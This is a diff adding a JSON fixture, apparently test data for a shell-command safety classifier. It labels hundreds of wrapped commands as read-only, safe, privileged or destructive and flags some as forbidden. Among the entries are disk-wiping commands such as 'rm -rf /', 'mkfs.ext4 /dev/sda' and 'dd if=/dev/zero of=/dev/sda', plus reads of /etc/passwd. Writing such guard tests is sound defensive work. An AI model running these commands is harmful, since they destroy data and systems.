@@ -1,0 +1,5094 @@
+{
+  "id": {
+    "class": "read-only",
+    "forbidden": false
+  },
+  "env id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nohup id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nice -n 5 id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ionice -c 2 id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "timeout 5 id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "flock /tmp/lk id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "chroot /mnt id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "valgrind id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "command id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "exec id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "setsid id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "xargs -I {} id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "whoami": {
+    "class": "read-only",
+    "forbidden": false
+  },
+  "env whoami": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nohup whoami": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nice -n 5 whoami": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ionice -c 2 whoami": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "timeout 5 whoami": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "flock /tmp/lk whoami": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "chroot /mnt whoami": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace whoami": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace whoami": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "valgrind whoami": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "command whoami": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "exec whoami": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "setsid whoami": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "xargs -I {} whoami": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "sudo whoami": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root whoami": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas whoami": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser whoami": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv whoami": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat whoami": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ls -la /tmp": {
+    "class": "read-only",
+    "forbidden": false
+  },
+  "env ls -la /tmp": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nohup ls -la /tmp": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nice -n 5 ls -la /tmp": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ionice -c 2 ls -la /tmp": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "timeout 5 ls -la /tmp": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "flock /tmp/lk ls -la /tmp": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "chroot /mnt ls -la /tmp": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace ls -la /tmp": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace ls -la /tmp": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "valgrind ls -la /tmp": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "command ls -la /tmp": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "exec ls -la /tmp": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "setsid ls -la /tmp": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "xargs -I {} ls -la /tmp": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "sudo ls -la /tmp": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root ls -la /tmp": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas ls -la /tmp": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser ls -la /tmp": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv ls -la /tmp": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat ls -la /tmp": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "git status --short": {
+    "class": "read-only",
+    "forbidden": false
+  },
+  "env git status --short": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nohup git status --short": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nice -n 5 git status --short": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ionice -c 2 git status --short": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "timeout 5 git status --short": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "flock /tmp/lk git status --short": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "chroot /mnt git status --short": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace git status --short": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace git status --short": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "valgrind git status --short": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "command git status --short": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "exec git status --short": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "setsid git status --short": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "xargs -I {} git status --short": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "sudo git status --short": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root git status --short": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas git status --short": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser git status --short": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv git status --short": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat git status --short": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "git log -20": {
+    "class": "read-only",
+    "forbidden": false
+  },
+  "env git log -20": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nohup git log -20": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nice -n 5 git log -20": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ionice -c 2 git log -20": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "timeout 5 git log -20": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "flock /tmp/lk git log -20": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "chroot /mnt git log -20": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace git log -20": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace git log -20": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "valgrind git log -20": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "command git log -20": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "exec git log -20": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "setsid git log -20": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "xargs -I {} git log -20": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "sudo git log -20": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root git log -20": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas git log -20": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser git log -20": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv git log -20": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat git log -20": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "cat /etc/passwd": {
+    "class": "read-only",
+    "forbidden": false
+  },
+  "env cat /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nohup cat /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nice -n 5 cat /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ionice -c 2 cat /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "timeout 5 cat /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "flock /tmp/lk cat /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "chroot /mnt cat /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace cat /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace cat /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "valgrind cat /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "command cat /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "exec cat /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "setsid cat /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "xargs -I {} cat /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "sudo cat /etc/passwd": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root cat /etc/passwd": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas cat /etc/passwd": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser cat /etc/passwd": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv cat /etc/passwd": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat cat /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "git push origin main": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "env git push origin main": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nohup git push origin main": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nice -n 5 git push origin main": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ionice -c 2 git push origin main": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "timeout 5 git push origin main": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "flock /tmp/lk git push origin main": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "chroot /mnt git push origin main": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace git push origin main": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace git push origin main": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "valgrind git push origin main": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "command git push origin main": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "exec git push origin main": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "setsid git push origin main": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "xargs -I {} git push origin main": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "sudo git push origin main": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root git push origin main": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas git push origin main": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser git push origin main": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv git push origin main": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat git push origin main": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "find . -name '*.rs'": {
+    "class": "read-only",
+    "forbidden": false
+  },
+  "env find . -name '*.rs'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nohup find . -name '*.rs'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nice -n 5 find . -name '*.rs'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ionice -c 2 find . -name '*.rs'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "timeout 5 find . -name '*.rs'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "flock /tmp/lk find . -name '*.rs'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "chroot /mnt find . -name '*.rs'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace find . -name '*.rs'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace find . -name '*.rs'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "valgrind find . -name '*.rs'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "command find . -name '*.rs'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "exec find . -name '*.rs'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "setsid find . -name '*.rs'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "xargs -I {} find . -name '*.rs'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "sudo find . -name '*.rs'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root find . -name '*.rs'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas find . -name '*.rs'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser find . -name '*.rs'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv find . -name '*.rs'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat find . -name '*.rs'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "env find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nohup find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nice -n 5 find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ionice -c 2 find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "timeout 5 find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "flock /tmp/lk find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "chroot /mnt find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "valgrind find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "command find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "exec find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setsid find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "xargs -I {} find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "find . -delete": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "env find . -delete": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nohup find . -delete": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nice -n 5 find . -delete": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ionice -c 2 find . -delete": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "timeout 5 find . -delete": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "flock /tmp/lk find . -delete": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "chroot /mnt find . -delete": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace find . -delete": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace find . -delete": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "valgrind find . -delete": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "command find . -delete": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "exec find . -delete": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "setsid find . -delete": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "xargs -I {} find . -delete": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "sudo find . -delete": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root find . -delete": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas find . -delete": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser find . -delete": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv find . -delete": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat find . -delete": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "sort -o /tmp/out /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "env sort -o /tmp/out /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nohup sort -o /tmp/out /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nice -n 5 sort -o /tmp/out /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ionice -c 2 sort -o /tmp/out /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "timeout 5 sort -o /tmp/out /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "flock /tmp/lk sort -o /tmp/out /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "chroot /mnt sort -o /tmp/out /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace sort -o /tmp/out /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace sort -o /tmp/out /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "valgrind sort -o /tmp/out /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "command sort -o /tmp/out /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "exec sort -o /tmp/out /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "setsid sort -o /tmp/out /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "xargs -I {} sort -o /tmp/out /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "sudo sort -o /tmp/out /tmp/in": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root sort -o /tmp/out /tmp/in": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas sort -o /tmp/out /tmp/in": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser sort -o /tmp/out /tmp/in": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv sort -o /tmp/out /tmp/in": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat sort -o /tmp/out /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "env sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nohup sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nice -n 5 sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ionice -c 2 sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "timeout 5 sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "flock /tmp/lk sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "chroot /mnt sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "valgrind sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "command sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "exec sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "setsid sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "xargs -I {} sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "sudo sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat sort --compress-program=/tmp/tool /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "rm -rf /tmp/example": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "env rm -rf /tmp/example": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nohup rm -rf /tmp/example": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nice -n 5 rm -rf /tmp/example": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ionice -c 2 rm -rf /tmp/example": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "timeout 5 rm -rf /tmp/example": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "flock /tmp/lk rm -rf /tmp/example": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "chroot /mnt rm -rf /tmp/example": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace rm -rf /tmp/example": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace rm -rf /tmp/example": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "valgrind rm -rf /tmp/example": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "command rm -rf /tmp/example": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "exec rm -rf /tmp/example": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "setsid rm -rf /tmp/example": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "xargs -I {} rm -rf /tmp/example": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "sudo rm -rf /tmp/example": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root rm -rf /tmp/example": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas rm -rf /tmp/example": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser rm -rf /tmp/example": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv rm -rf /tmp/example": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat rm -rf /tmp/example": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "rm -rf /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "env rm -rf /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nohup rm -rf /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nice -n 5 rm -rf /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ionice -c 2 rm -rf /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "timeout 5 rm -rf /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "flock /tmp/lk rm -rf /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "chroot /mnt rm -rf /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "strace -o /tmp/trace rm -rf /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ltrace -o /tmp/trace rm -rf /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "valgrind rm -rf /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "command rm -rf /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "exec rm -rf /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "setsid rm -rf /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "xargs -I {} rm -rf /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "sudo rm -rf /": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "sudo -u root rm -rf /": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "doas rm -rf /": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "runuser rm -rf /": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "setpriv rm -rf /": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "GIT_PAGER=cat rm -rf /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "mkfs.ext4 /dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "env mkfs.ext4 /dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nohup mkfs.ext4 /dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nice -n 5 mkfs.ext4 /dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ionice -c 2 mkfs.ext4 /dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "timeout 5 mkfs.ext4 /dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "flock /tmp/lk mkfs.ext4 /dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "chroot /mnt mkfs.ext4 /dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "strace -o /tmp/trace mkfs.ext4 /dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ltrace -o /tmp/trace mkfs.ext4 /dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "valgrind mkfs.ext4 /dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "command mkfs.ext4 /dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "exec mkfs.ext4 /dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "setsid mkfs.ext4 /dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "xargs -I {} mkfs.ext4 /dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "sudo mkfs.ext4 /dev/sda": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "sudo -u root mkfs.ext4 /dev/sda": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "doas mkfs.ext4 /dev/sda": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "runuser mkfs.ext4 /dev/sda": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "setpriv mkfs.ext4 /dev/sda": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "GIT_PAGER=cat mkfs.ext4 /dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "dd if=/dev/zero of=/dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "env dd if=/dev/zero of=/dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nohup dd if=/dev/zero of=/dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nice -n 5 dd if=/dev/zero of=/dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ionice -c 2 dd if=/dev/zero of=/dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "timeout 5 dd if=/dev/zero of=/dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "flock /tmp/lk dd if=/dev/zero of=/dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "chroot /mnt dd if=/dev/zero of=/dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "strace -o /tmp/trace dd if=/dev/zero of=/dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ltrace -o /tmp/trace dd if=/dev/zero of=/dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "valgrind dd if=/dev/zero of=/dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "command dd if=/dev/zero of=/dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "exec dd if=/dev/zero of=/dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "setsid dd if=/dev/zero of=/dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "xargs -I {} dd if=/dev/zero of=/dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "sudo dd if=/dev/zero of=/dev/sda": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "sudo -u root dd if=/dev/zero of=/dev/sda": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "doas dd if=/dev/zero of=/dev/sda": {
+    "class": "privileged",
+    "forbidden": true
+  },
